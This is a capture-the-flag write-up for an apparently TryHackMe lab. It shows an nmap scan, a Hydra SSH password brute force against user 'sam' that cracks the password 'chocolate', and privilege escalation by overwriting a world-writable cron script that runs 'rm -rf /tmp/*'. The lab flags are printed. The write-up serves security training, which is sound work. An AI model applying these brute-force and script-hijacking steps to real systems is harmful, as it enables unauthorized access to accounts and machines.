# [Day 20] Cronjob Privilege Escalation

## Instructions

You think the evil Christmas monster is acting on Elf Sam's account!

Hack into her account and escalate your privileges on this Linux machine.

*There is no supporting material - the only new concept in this challenge is Linux cronjobs. Join our Discord if you're really struggling.*

## #1 - What port is SSH running on?

*Hint: Use nmap to enumerate services on ports 4000 and 5000.*

Nmap tells us that SSH is running on port `4567`:

~~~
$ sudo nmap -sS -sV -A 10.10.11.225
[sudo] password for unknown: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 23:23 CEST
Nmap scan report for 10.10.11.225
Host is up (0.083s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:11:a1:86:f9:9a:fc:63:bd:14:51:36:43:c0:a3:c8 (RSA)
|   256 40:23:c8:3b:10:46:9d:d6:a6:50:76:3a:85:31:90:e3 (ECDSA)
|_  256 16:7a:b1:83:30:b0:4a:2c:ed:53:38:06:b6:e1:96:96 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/3%OT=4567%CT=1%CU=38411%PV=Y%DS=2%DC=T%G=Y%TM=5EAF36
OS:87%P=x86_64-pc-linux-gnu)SEQ(SP=F6%GCD=1%ISR=100%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=F6%GCD=1%ISR=100%TI=Z%II=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.48 ms 10.9.0.1
2   80.32 ms 10.10.11.225

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.81 seconds
~~~


## #2 - Crack sam's password and read flag1.txt

*Hint: Complete the challenge on day 17, to understand how to use Hydra.*

~~~
$ hydra -l sam -P /data/downloads/rockyou.txt ssh://10.10.11.225:4567 -t 4 -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 23:28:49
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.11.225:4567/
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "password" - 4 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "iloveyou" - 5 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "princess" - 6 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "1234567" - 7 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "rockyou" - 8 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "12345678" - 9 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "abc123" - 10 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "nicole" - 11 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "daniel" - 12 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "babygirl" - 13 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "monkey" - 14 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "lovely" - 15 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "jessica" - 16 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "654321" - 17 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "michael" - 18 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "ashley" - 19 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "qwerty" - 20 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "111111" - 21 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "iloveu" - 22 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "000000" - 23 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "michelle" - 24 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "tigger" - 25 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "sunshine" - 26 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "chocolate" - 27 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.11.225 - login "sam" - pass "password1" - 28 of 14344398 [child 2] (0/0)
[4567][ssh] host: 10.10.11.225   login: sam   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 23:29:40
~~~

Now, we can show the flag:

~~~
$ sshpass -p chocolate ssh sam@10.10.11.225 -p 4567 cat flag1.txt
THM{dec4389bc09669650f3479334532aeab}
~~~

## #3 - Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

### Where is the flag?

First thing first was to locate flag2.txt:

~~~
$ find / -name flag2.txt 2>/dev/null
/home/ubuntu/flag2.txt
~~~

Analyzing the file's permissions shows that only `ubuntu` can read the flag:
~~~
$ ls -l /home/ubuntu/flag2.txt 
-r-------- 1 ubuntu ubuntu 38 Dec 19 20:09 /home/ubuntu/flag2.txt
~~~

### Cron jobs

Now, we know that this has something to do with a cron job.

Checking `/etc/cron*` files as well as `crontab` and `crontab -l -u ubuntu` does not reveal anything interesting.

### clean_up script

Now, interestingly, listing all files owned by the `ubuntu` user reveals a script (`clean_up.sh`) in `/home/scripts/`:

~~~
$ find / -user ubuntu 2>/dev/null
/home/scripts/clean_up.sh
/home/ubuntu
/home/ubuntu/.ssh
/home/ubuntu/.profile
/home/ubuntu/.bash_history
/home/ubuntu/.cache
/home/ubuntu/.nano
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.vim
/home/ubuntu/.vim/.netrwhist
/home/ubuntu/flag2.txt
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
~~~

Let's see what this is:

~~~
sam@ip-10-10-11-225:/home/scripts$ ls -l
total 8
-rwxrwxrwx 1 ubuntu ubuntu 47 May  4 05:42 clean_up.sh
-rw-r--r-- 1 root   root    5 Dec 19 20:55 test.txt
sam@ip-10-10-11-225:/home/scripts$ cat clean_up.sh 
rm -rf /tmp/*
~~~

This script is actually removing all files in the `/tmp` directory. There is no indication that it is run every minute but we could guess this is our entry point and anyway, as we can execute it, we don't really care!

More interestingly, it is owned by `ubuntu` but the file has all permissions (`777`), meaning read, write, execute for everyone. It means that we can modify and execute it.

### Flag

Let's modify this script to show the flag:

~~~
$ cd /home/scripts/
$ echo "cat /home/ubuntu/flag2.txt" > clean_up.sh
$ ./clean_up.sh
THM{b27d33705f97ba2e1f444ec2da5f5f61}
~~~
